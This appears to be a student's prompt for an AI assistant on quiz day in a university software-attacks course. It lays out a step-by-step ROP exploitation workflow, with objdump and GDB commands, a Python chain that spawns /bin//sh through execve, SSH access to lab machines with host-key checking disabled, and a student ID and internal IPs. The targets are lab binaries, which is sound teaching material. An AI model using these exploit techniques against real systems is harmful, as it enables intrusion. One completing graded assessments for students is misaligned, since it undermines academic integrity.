# Quiz Day Prompt — Paste This as Your First Message

---

You are helping me solve EPL326 (Software Attacks, University of Cyprus) Quiz 4 on quiz day.
I am student `apieri01`, group 6.

## Your first actions — do these before anything else:

1. **Read these files in order** (they are in `C:\Users\andre\Desktop\326_quiz3\`):
   - `LLM_INSTRUCTIONS.md` — full attack methodology, decision tree, GDB workflow, ROP chain construction
   - `README.md` — all solved sets with payloads, gadget tables, confirmed addresses
   - `FINDINGS.md` — step-by-step findings from Quiz 4 example sets (bin2 + g1), confirmed via GDB
   - `STATUS.md` — confirmed values: gadget_base, OFFSET, WR_ADDR, results table
   - `SSH_SETUP.md` — how to connect to the lab machine from a lab machine

2. **Understand the established methodology** before touching any binary:
   - Quiz 4 binaries all use `mmap + movb` dynamic gadget building in `main()`
   - The same gadget bytes appear in different ORDER across bin.1 and bin.2 — decode fresh each time
   - `gadget_base` formula is off by 8 — always verify via GDB memory dump
   - OFFSET differs between binaries — always read `lea -0xNN(%ebp)` in `display_file` per binary
   - Never use `.bss` as WR_ADDR — always use `mmap_base + 0x500`

3. **SSH to the lab machine** using the instructions in `SSH_SETUP.md`:
   - You are already on a lab machine — use `ssh lab103` (key is in NFS home `~/.ssh/lab_key`)
   - Or: `ssh -i ~/.ssh/lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.53`
   - If 10.16.13.53 (ws15) is down, try 10.16.13.89 (ws14) or other 103wsX IPs in the 10.16.13.x range
   - Once connected: `cd ~/326_quiz3` (repo is already cloned there)
   - If repo not present: `git clone https://github.com/andreas1612/326_quiz3.git ~/326_quiz3`

4. **I will tell you where the quiz binaries are.** Upload them to the lab:
   ```bash
   mkdir -p ~/326_quiz3/g6
   scp -i ~/.ssh/lab_key /path/to/bin.1 /path/to/bin.2 apieri01@10.16.13.53:~/326_quiz3/g6/
   ```

---

## What to do with the quiz binaries

Follow the exact workflow from `FINDINGS.md` and `LLM_INSTRUCTIONS.md`:

### Step 1 — Recon (30 seconds each)
```bash
readelf -l ./bin.X | grep GNU_STACK   # expect RW (NX on)
readelf -h ./bin.X | grep Type        # expect ET_EXEC (no PIE)
objdump -d ./bin.X | grep -E "^[0-9a-f]+ <"  # list functions
```

### Step 2 — Confirm mmap+movb pattern
```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"
```
Expected: dozens of `movb` lines + `call mmap@plt`. This confirms dynamic gadget building.

### Step 3 — Decode gadget table from movb bytes
```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb"
```
Read `$0xNN` values in order. Every 3 bytes = one gadget (2-byte instruction + `0xc3` ret).
Map bytes to gadgets using the reference card in `README.md` Section 6 / `LLM_INSTRUCTIONS.md` Section C.

### Step 4 — Calculate mmap_base, then verify gadget_base via GDB
Find the hardcoded address pushed before `call mmap` in main():
```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -B5 "mmap"
```
Formula: `mmap_base = (hardcoded_addr // 0x1000 - 0x1000) * 0x1000`
Expected (from example sets): `mmap_base = 0x07049000`

**Always verify gadget_base via GDB** — formula can be off by 8:
```python
# Write to /tmp/gdb_verify.py then run:
import gdb
gdb.execute("set pagination off")
gdb.execute("b *0x8049376")   # after memcpy in display_file — adjust if different binary
gdb.execute("run exploit.dummy")
for i in range(0, 32, 4):
    addr = 0x070493e0 + i
    v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
    b = v.to_bytes(4, 'little')
    print("0x%08x: %s" % (addr, ' '.join('%02x'%x for x in b)))
gdb.execute("quit")
```
```bash
python3 -c "print('60 ' + 'A'*60)" > exploit.dummy
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch -ex "source /tmp/gdb_verify.py" ./bin.1 2>&1 | grep "0x07049"
```
The address where you see `31 c0 c3` or `58 5b c3` at the start = actual gadget_base.

### Step 5 — Find OFFSET from display_file disassembly
```bash
objdump -d ./bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep "lea"
```
Find `lea -0xNN(%ebp),%eax` before `call memcpy`. OFFSET = NN + 4.
- Seen in examples: `0x34` → OFFSET=56, `0x30` → OFFSET=52
- Check both bin.1 and bin.2 — they can differ.

### Step 6 — Build and test exploit
Use `~/326_quiz3/tools/solve_rop_template.py` as base. WR_ADDR = mmap_base + 0x500.

Chain structure (from `FINDINGS.md`):
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = <gadget_base>; WR = 0x07049500; OFFSET = <from step 5>
chain  = b'A' * OFFSET
chain += p32(G_POP) + b'/bin' + p32(WR)   + p32(G_MPTR)
chain += p32(G_POP) + b'//sh' + p32(WR+4) + p32(G_MPTR)
chain += p32(G_POP) + p32(WR) + p32(0x41414141) + p32(G_MEBX)
chain += p32(G_XECX) + p32(G_XEDX) + p32(G_XEAX) + p32(G_MOVAL) + p32(G_INT80)
data = str(len(chain)).encode() + b' ' + chain
with open('exploit.1', 'wb') as f: f.write(data)
```

### Step 7 — Verify
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
```
Expected: `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)`

---

## Key numbers to re-use from example sets (verify these hold for group 6!)

| Value | Example sets | Action |
|-------|-------------|--------|
| gadget_base | `0x070493e0` | Verify via GDB — may differ for new binaries |
| mmap_base | `0x07049000` | Recompute from hardcoded_addr in new binary |
| WR_ADDR | `0x07049500` | Always mmap_base+0x500, never .bss |
| OFFSET bin.1 | 56, 52, or 48 | Read `lea -0xNN(%ebp)` fresh for each binary |
| OFFSET bin.2 | 56, 52, or 48 | Read `lea -0xNN(%ebp)` fresh for each binary |
| Gadget bytes | Same 8 gadgets | ORDER may differ — decode movb table fresh |

---

## Critical warnings (from FINDINGS.md)

- **Gadget order differs between bin.1 and bin.2** — never copy gadget offsets between binaries
- **gadget_base formula can be off by 8** — always dump memory at formula result ± 16 bytes
- **Never use .bss as WR_ADDR** — init_data() or TEMP value may poison it → execve fails silently
- **g1/bin.1 had INT80 and MOVAL swapped at +0x12/+0x15** — verify byte values, not just offsets
- **Breakpoint address in GDB (`0x8049376`)** is from example sets — if display_file differs, find the instruction after `call memcpy` for the new binary via objdump

---

## Tools on lab machine (~/326_quiz3/tools/)

```bash
python3 ~/326_quiz3/tools/find_gadgets.py ./bin.X    # won't find dynamic gadgets, but confirms mmap pattern
cp ~/326_quiz3/tools/solve_rop_template.py ./solve_g6.py  # fill in addresses and run
```

---

## If something fails

1. **Segfault, no output** → wrong OFFSET or wrong gadget address
   - Re-read `lea -0xNN(%ebp)` in display_file
   - Re-dump gadget memory via GDB at suspected gadget_base ± 16 bytes
2. **execve returns -1, no output** → WR_ADDR has no null terminator
   - Confirm you're using mmap_base+0x500, not .bss
3. **Nothing runs** → check `int 0x80` exists: `objdump -d bin.X | grep "int.*0x80"`
4. **GDB breakpoint doesn't hit** → display_file address changed, find new breakpoint:
   `objdump -d bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep -A2 "memcpy"`

Detailed failure diagnosis in `LLM_INSTRUCTIONS.md` Section C → "ROP failure diagnosis" table.
